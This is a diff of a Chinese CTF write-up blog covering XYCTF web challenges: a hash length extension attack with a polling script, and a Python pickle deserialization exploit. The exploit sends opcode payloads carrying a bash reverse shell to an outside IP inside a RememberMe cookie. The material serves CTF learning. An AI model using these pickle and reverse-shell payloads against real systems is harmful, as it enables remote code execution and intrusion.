+<p>这里拓展字符是时间戳，这个time()时间戳是动态的怎么处理？其实只需要要计算当前的时间戳，然后往上加个几十秒(这段时间供你填参数)，然后写代码，持续发送请求即可。</p>
+<p>计算当前时间戳</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$time=time();
+</span></span><span class="line"><span class="cl">echo $time;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>哈希长度拓展工具代码，这个需要私包</p>
+<p><a class="link" href="https://github.com/shellfeel/hash-ext-attack"  target="_blank" rel="noopener"
+    >GitHub - shellfeel/hash-ext-attack: 哈希长度扩展攻击利用脚本，免去了hashpump需要编译的烦恼</a>下载后与此代码放同一目录即可运行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">loguru</span> <span class="kn">import</span> <span class="n">logger</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">common.HashExtAttack</span> <span class="kn">import</span> <span class="n">HashExtAttack</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hash_ext_attack</span> <span class="o">=</span> <span class="n">HashExtAttack</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">logger</span><span class="o">.</span><span class="n">remove</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">logger</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s2">&#34;INFO&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hash_ext_attack</span><span class="o">.</span><span class="n">input_run</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>参数就这个（flag是uuid模式就是36+XYCTF{}7个字符就是43），当时时间戳是1745397600，我填的1745397700，留足够的时间填参数</p>
+<img src="image-20250423164118396.png" alt="image-20250423164118396" style="zoom: 33%;" />
+<p>注意value不要带上时间戳time().</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span>  <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://gz.imxbt.cn:20206/?value=</span><span class="si">%80%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00X%01%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00%00&amp;md5=d0d430dc54fd23b970fb394cee49caa8&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="s2">&#34;XYCTF&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250423164429272.png" alt="image-20250423164429272" style="zoom: 33%;" />
+<h2 id="login">login
+</h2><p>目录扫描得到register.php</p>
+<p>注册一个账号后，然后登入抓包，发现了base64编码的数据，有很多A字符</p>
+<img src="image-20250423184735126.png" alt="image-20250423184735126" style="zoom:33%;" />
+<p>解码发现存有用户信息且发现环境是python，那就是打pickle反序列化</p>
+<img src="image-20250423185040786.png" alt="image-20250423185040786" style="zoom:33%;" />
+<p>存在过滤（好像是r被过滤，reduce打不了），普通打法打不了，用 opcode 加反弹shell来rce</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">shell</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/101.200.39.193/5000 0&lt;&amp;1&#34;&#39;&#39;&#39;</span>  <span class="c1"># 反弹shell语句</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://gz.imxbt.cn:20243/&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;(ctimeit
+</span></span></span><span class="line"><span class="cl"><span class="s1">timeit
+</span></span></span><span class="line"><span class="cl"><span class="s1">(cos
+</span></span></span><span class="line"><span class="cl"><span class="s1">system
+</span></span></span><span class="line"><span class="cl"><span class="s1">V&#39;&#39;&#39;</span> <span class="o">+</span> <span class="n">shell</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">oo.&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">header</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Cookie&#34;</span><span class="p">:</span> <span class="s2">&#34;RememberMe=&#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当然有最简版本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;(cos
+</span></span></span><span class="line"><span class="cl"><span class="s1">system
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/[ip]/2333 0&gt;&amp;1&#34;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">o.
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://xz.aliyun.com/news/7032?time__1311=YqfxgD2D0A0%3DDtD%2FWrWqiq7IrtwR7ebY4D&amp;u_atoken=2031ac554e08f8a8ef72f4cf56d69184&amp;u_asig=1a0c399f17432331368194540e0036"  target="_blank" rel="noopener"
+    >pickle反序列化初探-先知社区</a></p>
+<p><a class="link" href="https://xz.aliyun.com/news/11253"  target="_blank" rel="noopener"
+    >最近碰到的 Python pickle 反序列化小总结-先知社区</a></p>
+<h2 id="baby_unserialize">Baby_Unserialize
+</h2><p>看不懂，java都没学，留几篇文章在这吧</p>
+<p><a class="link" href="https://vidar-team.feishu.cn/docx/LJN4dzu1QoEHt4x3SQncYagpnGd"  target="_blank" rel="noopener"
+    >‌﻿⁠‌‍‌‌⁠﻿⁠⁠‍﻿﻿‌‬‌‍‌⁠‌‍‌⁠探索Java反序列化绕WAF新姿势 - 飞书云文档</a></p>
+<p><a class="link" href="https://blog.csdn.net/uuzeray/article/details/138274291"  target="_blank" rel="noopener"
+    >【Web】2024XYCTF题解(全)_xyctf2024-CSDN博客</a></p>
+<p><a class="link" href="https://blog.csdn.net/Err0r233/article/details/138233565"  target="_blank" rel="noopener"
+    >XYCTF2024-Web方向题解-CSDN博客</a></p>
 
 </section>
 
